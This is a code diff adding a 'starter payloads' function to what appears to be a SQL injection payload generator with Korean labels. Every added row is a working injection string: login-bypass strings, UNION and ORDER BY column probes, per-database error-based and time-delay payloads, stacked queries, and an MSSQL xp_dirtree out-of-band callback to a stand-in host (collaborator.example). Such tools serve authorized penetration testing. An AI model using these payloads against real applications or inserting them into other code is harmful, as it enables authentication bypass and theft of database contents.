@@ -430,6 +430,11 @@
         });
       }
 
+      assembled = uniquePayloads([
+        ...assembled,
+        ...getStarterPayloads(db, point, filters)
+      ]);
+
       // Render
       panel.innerHTML = `
         <h2>결과</h2>
@@ -485,6 +490,52 @@
       if (filters.caseBypass) notes.push('대소문자 혼합');
 
       return { possible, notes, warn, info };
+    }
+
+    function getStarterPayloads(db, point, filters) {
+      const wrap = code => sqliWrap(code, 'probe', point, db, filters);
+      const delay = {
+        mysql: 'SLEEP(5)',
+        mssql: "WAITFOR DELAY '0:0:5'",
+        oracle: "DBMS_PIPE.RECEIVE_MESSAGE('a',5)",
+        postgres: 'pg_sleep(5)',
+        sqlite: 'RANDOMBLOB(100000000)'
+      };
+      const err = {
+        mysql: 'extractvalue(1,concat(0x7e,version()))',
+        mssql: 'CONVERT(int,@@version)',
+        oracle: "CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))",
+        postgres: "CAST(version() AS int)",
+        sqlite: "json_extract('x','$.')"
+      };
+      const rows = [
+        { title: 'Auth bypass — OR true', code: point === 'integer' ? '1 OR 1=1--' : "' OR '1'='1'--", note: '로그인 우회/기본 취약점 확인용' },
+        { title: 'Auth bypass — comment close', code: point === 'integer' ? '1 OR 1=1#' : "' OR 1=1#'", note: 'MySQL # 주석을 쓰는 로그인 우회 변형' },
+        { title: 'Quote probe — single quote', code: point === 'integer' ? '1\'' : "'", note: '홑따옴표 처리 오류 확인' },
+        { title: 'Quote probe — double quote', code: point === 'integer' ? '1"' : '"', note: '쌍따옴표 처리 오류 확인' },
+        { title: 'Boolean probe — TRUE', code: wrap('AND 1=1'), note: 'Blind SQLi 응답 차이 확인용 TRUE 조건' },
+        { title: 'Boolean probe — FALSE', code: wrap('AND 1=2'), note: 'Blind SQLi 응답 차이 확인용 FALSE 조건' },
+        { title: 'UNION probe — 1 column', code: sqliWrap('UNION SELECT NULL', 'union', point, db, filters), note: 'UNION 컬럼 수 탐색 시작점' },
+        { title: 'UNION probe — 2 columns', code: sqliWrap('UNION SELECT NULL,NULL', 'union', point, db, filters), note: 'UNION 컬럼 수 탐색' },
+        { title: 'UNION probe — 3 columns', code: sqliWrap('UNION SELECT NULL,NULL,NULL', 'union', point, db, filters), note: 'UNION 컬럼 수 탐색' },
+        { title: 'ORDER BY probe — 1', code: wrap('ORDER BY 1'), note: '컬럼 수 탐색 또는 정렬 인젝션 확인' },
+        { title: 'ORDER BY probe — 2', code: wrap('ORDER BY 2'), note: '컬럼 수 탐색 또는 정렬 인젝션 확인' },
+        { title: 'Error probe', code: wrap(`AND ${err[db] || err.mysql}`), note: 'DB 오류 메시지 노출 여부 확인' },
+        { title: 'Time delay probe', code: db === 'mssql' ? sqliWrap(`; ${delay.mssql}--`, 'stacked', point, db, filters) : wrap(`AND ${delay[db] || delay.mysql}`), note: '응답 지연 기반 Blind SQLi 확인' },
+        { title: 'Stacked query probe', code: sqliWrap('; SELECT 1--', 'stacked', point, db, filters), note: '세미콜론 뒤 다중 쿼리 실행 여부 확인' },
+        { title: 'OOB callback probe', code: db === 'mssql' ? "; EXEC master..xp_dirtree '\\\\collaborator.example\\a'--" : wrap("AND 1=1 /* replace with Burp Collaborator/interactsh payload */"), note: 'Out-of-band 콜백 가능성 확인용 골격' },
+      ];
+      return rows;
+    }
+
+    function uniquePayloads(items) {
+      const seen = new Set();
+      return items.filter(item => {
+        const key = `${item.title}|${item.code}`;
+        if (seen.has(key)) return false;
+        seen.add(key);
+        return true;
+      });
     }
 
     function copySQLi(i) {
